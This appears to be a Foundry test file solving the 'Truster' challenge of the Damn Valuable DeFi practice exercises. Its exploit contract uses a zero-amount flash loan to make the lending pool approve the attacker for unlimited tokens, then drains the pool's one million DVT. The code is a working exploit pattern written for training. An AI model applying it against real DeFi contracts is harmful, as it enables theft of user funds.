// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256,
        address,
        address,
        bytes calldata data
    ) external returns (bool);
}

interface IDamnValuableToken {
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTruster {
    address pool;
    address token;
    address attacker;
    uint256 TOKEN_BALANCE = 1_000_000e18; // 1 million DVT

    constructor(
        address poolAdr,
        address tokenAdr,
        address attackerAdr
    ) {
        pool = poolAdr;
        token = tokenAdr;
        attacker = attackerAdr;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        ITrusterLenderPool(pool).flashLoan(
            0, // amount
            address(this), // borrower
            address(token), // target
            data
        );
        IDamnValuableToken(token).transferFrom(
            pool,
            address(attacker),
            TOKEN_BALANCE
        );
    }
}

contract TrusterTest is Test {
    TrusterLenderPool pool;
    DamnValuableToken token;
    ExploitTruster exploitTruster;

    address owner;
    address attacker;
    uint256 TOKEN_BALANCE = 1_000_000e18; // 1 million DVT

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(DamnValuableToken(token));

        vm.label(address(token), "token");
        vm.label(address(pool), "pool");

        vm.deal(address(pool), 100 ether);

        token.transfer(address(pool), TOKEN_BALANCE);
        assertEq(token.balanceOf(address(pool)), TOKEN_BALANCE);
    }

    function testTrusterExploit() public {
        exploitTruster = new ExploitTruster(
            address(pool),
            address(token),
            attacker
        );
        exploitTruster.exploit();
        validation();
    }

    function validation() public {
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(address(attacker)), TOKEN_BALANCE);
    }
}
